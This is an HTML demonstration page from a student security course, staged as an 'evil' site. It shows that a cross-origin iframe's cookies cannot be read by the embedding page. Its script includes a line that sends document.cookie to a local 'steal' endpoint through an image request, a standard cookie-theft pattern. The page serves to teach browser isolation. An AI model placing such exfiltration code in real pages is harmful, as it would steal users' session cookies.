<html>
<title>
Himarsha's Evil Site
</title>


<h1>Welcome to my evil page! - Unsuccessful attack</h1>
Himarsha Jayanetti, CS595 - Spring 2021, ODU
<br><br>
This page is created to demonstrate how to prevent the stealing of cookies from a embedded (inside an iframe) site on another HTML at a cross origin domain.
<br><br>
The iframe cookie will not be displayed outside of iframe. Wait for 5 seconds and you will see only the main page cookie appear.
<p>
<p>

<script>
    document.cookie = 'main=cookie'
    const iframe = document.createElement('iframe')
    iframe.src = 'http://localhost:5003/'
    document.body.appendChild(iframe)
    document.write(iframe.contentDocument.cookie)
    console.log(iframe.contentDocument.cookie)

    // wait 5 seconds
    setTimeout(function() {
    const p = document.createElement('p')
    p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
    document.body.appendChild(p)

    new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
}, 5000);
</script>

